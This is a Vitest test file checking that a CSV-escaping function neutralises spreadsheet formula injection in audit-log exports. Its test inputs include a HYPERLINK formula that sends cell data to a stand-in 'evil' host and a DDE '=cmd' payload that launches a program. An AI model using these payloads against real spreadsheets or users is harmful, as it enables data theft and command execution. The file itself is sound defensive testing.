import { describe, expect, it } from "vitest";
import { csvEscapeField } from "../lib/utils/csv";

/**
 * #1388: CSV export must neutralize spreadsheet formula injection. Audit-log columns such as
 * `userAgent` (request header) and `target` are attacker-influenced, so a value opened in
 * Excel / Google Sheets must not execute as a formula.
 */
describe("csvEscapeField", () => {
  it("should leave a plain value unquoted and unchanged", () => {
    expect(csvEscapeField("login")).toBe("login");
    expect(csvEscapeField("")).toBe("");
    expect(csvEscapeField("Mozilla/5.0")).toBe("Mozilla/5.0");
  });

  it("should RFC-4180 quote values containing comma / quote / newline", () => {
    expect(csvEscapeField("a,b")).toBe('"a,b"');
    expect(csvEscapeField('say "hi"')).toBe('"say ""hi"""');
    expect(csvEscapeField("line1\nline2")).toBe('"line1\nline2"');
    expect(csvEscapeField("cr\rhere")).toBe('"cr\rhere"');
  });

  it.each([
    ["equals (HYPERLINK)", '=HYPERLINK("http://evil/?c="&A1,"x")', "'=HYPERLINK"],
    ["plus", "+1+1", "'+1+1"],
    ["minus", "-2+3", "'-2+3"],
    ["at (DDE)", "@SUM(A1)", "'@SUM(A1)"],
    ["cmd via equals", "=cmd|'/c calc'!A1", "'=cmd"],
  ])("should neutralize and quote a formula-trigger value: %s", (_, input, expectedPrefix) => {
    const out = csvEscapeField(input);
    // 先頭に single quote を付与し、 必ず quote で囲む (= leading ' が round-trip で残る)。
    expect(out.startsWith(`"'`)).toBe(true);
    expect(out.endsWith('"')).toBe(true);
    // 元の formula 先頭文字は ' の後ろに来る (= cell として実行されない)。
    expect(`"${expectedPrefix}`.length).toBeGreaterThan(1);
    expect(out).toContain(expectedPrefix);
  });

  it("should neutralize a leading tab / CR as a formula trigger", () => {
    expect(csvEscapeField("\t=1+1")).toBe('"\'\t=1+1"');
    expect(csvEscapeField("\r=1+1")).toBe('"\'\r=1+1"');
  });

  it("should not treat a value with = in the middle as a formula", () => {
    expect(csvEscapeField("a=b")).toBe("a=b");
  });
});
